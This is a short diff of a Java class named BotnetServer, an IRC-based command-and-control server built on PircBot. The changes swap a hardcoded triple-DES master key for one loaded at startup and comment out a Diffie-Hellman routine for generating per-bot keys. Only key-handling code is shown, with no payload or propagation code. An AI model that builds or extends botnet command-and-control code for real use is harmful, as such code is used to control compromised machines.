@@ -66,14 +66,14 @@ public class BotnetServer extends PircBot {
 	private Scanner input;
 	private boolean inChat;
 	
-	private static final byte[] key = 
+	/*private static final byte[] key = 
 	{(byte)0x2e, (byte)0xa0, (byte)0x8c, (byte)0x66, (byte)0xf6, (byte)0x8d, (byte)0x71, 
 	(byte)0xae, (byte)0x83, (byte)0xa1, (byte)0x24, (byte)0x96, (byte)0xa3, (byte)0xc3, 
 	(byte)0xd0, (byte)0x91, (byte)0x7f, (byte)0x86, (byte)0x69, (byte)0x78, (byte)0x99, 
 	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
-	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
+	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};*/
 
-	private Key masterKey;
+	private static Key masterKey;
 	//private Cipher masterCipher;
 	
 	private MsgEncrypt masterMsgE;
@@ -99,7 +99,8 @@ public class BotnetServer extends PircBot {
 			input = new Scanner(System.in);
 			
 			botInfo = new HashMap<String, Key>();
-			masterKey = new SecretKeySpec(key, "DESede");
+			masterKey = MsgEncrypt.getStartKey();
+			//masterKey = new SecretKeySpec(key, "DESede");
 			//masterCipher = Cipher.getInstance("AES");
 			//masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
 			masterMsgE = MsgEncrypt.getInstance(masterKey);
@@ -111,7 +112,7 @@ public class BotnetServer extends PircBot {
 	}
 	
 	// TODO: put this into the MsgEncrypt object as a static method
-	protected Key genCCBotKey() throws Exception {
+	/*protected Key genCCBotKey() throws Exception {
 		AlgorithmParameterGenerator paramGen = AlgorithmParameterGenerator.getInstance("DH");
 		paramGen.init(1024);
 		AlgorithmParameters params = paramGen.generateParameters();
@@ -133,7 +134,7 @@ public class BotnetServer extends PircBot {
 		MsgEncrypt m2 = MsgEncrypt.getInstance(bKeyPair, aPubKey);
 		Key privKey = msgE.getPrivateKey();
 		return privKey;
-	}
+	}*/
 	
 	protected void onConnect() {
 		joinChannel(CHANNEL);
